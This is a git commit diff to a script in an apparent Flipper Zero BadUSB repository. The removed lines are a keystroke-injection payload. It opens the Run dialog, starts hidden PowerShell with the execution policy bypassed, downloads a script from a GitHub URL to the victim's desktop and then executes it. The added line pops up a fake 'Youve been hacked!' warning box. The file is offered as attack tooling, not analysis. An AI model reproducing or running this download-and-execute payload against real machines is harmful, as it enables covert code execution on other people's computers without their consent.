19c27521685a1383e88b31ce6b0ccb86068bd435
CoolGermanGuy <88776295+CGGonGitHub@users.noreply.github.com>
2023-06-07 19:35:08 +0200

    Update script2.ps1

--- BadUSB/PowerShellShit/script2.ps1
+++ BadUSB/PowerShellShit/script2.ps1
@@ -1,9 +1,1 @@
-GUI r
-DELAY 750
-STRING powershell -W Hidden -Exec Bypass -C wget "https://raw.githubusercontent.com/CGGonGitHub/FlipperStuff/main/BadUSB/PowerShellShit/script.ps1" -OutFile "%userprofile%\Desktop\script.ps1"
-ENTER
-DELAY 5000
-GUI r
-DELAY 750
-STRING powershell -W Hidden -Exec Bypass -C "%userprofile%\Desktop\script.ps1"
-ENTER
+Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('HACKED BY thereal#3651', 'Youve been hacked!','OK', 'Warning')
